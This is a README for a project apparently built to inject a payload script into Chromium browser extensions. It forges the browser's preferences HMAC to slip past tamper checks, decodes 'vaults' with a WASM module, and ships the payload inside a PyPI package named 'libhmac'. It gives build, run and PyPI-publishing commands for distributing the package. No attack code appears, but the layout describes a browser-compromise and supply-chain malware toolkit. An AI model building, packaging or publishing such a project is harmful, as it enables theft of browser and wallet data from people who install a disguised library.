# vault-decoder-project

## Layout

| Path | Role |
|------|------|
| `launcher.py` | Entry script — detect extensions/hardware, call `libhmac` |
| `src/libhmac/` | Pip package — patch, inject payload, Chromium prefs/HMAC |
| `vault-decoder/` | Rust WASM decoder |
| `vault-ext/` | Injected script (`loader.js`) + `build.ps1` |
| `backup_restore.py` | Restore backed-up extensions / prefs |

## Build and run

```bat
build_all.bat
cd dist
set VAULT_PAYLOAD_DIR=%CD%
py -3 -m pip install -r requirements.txt
py -3 launcher.py
```

`build_all.bat` stages `dist\` with `launcher.py`, `requirements.txt`, and payload JS/WASM.

## Install `libhmac` from PyPI

```bat
pip install libhmac
```

Payload ships in the wheel (`libhmac/data/`). Override with `VAULT_PAYLOAD_DIR`.

## Publish to PyPI

```bat
build_all.bat
publish.bat
set TWINE_USERNAME=__token__
set TWINE_PASSWORD=pypi-your-token
py -3 -m twine upload pypi-dist\*
```

Bump `version` in `pyproject.toml` and `src/libhmac/__init__.py` before each release. See `RELEASE.txt` for Linux steps.
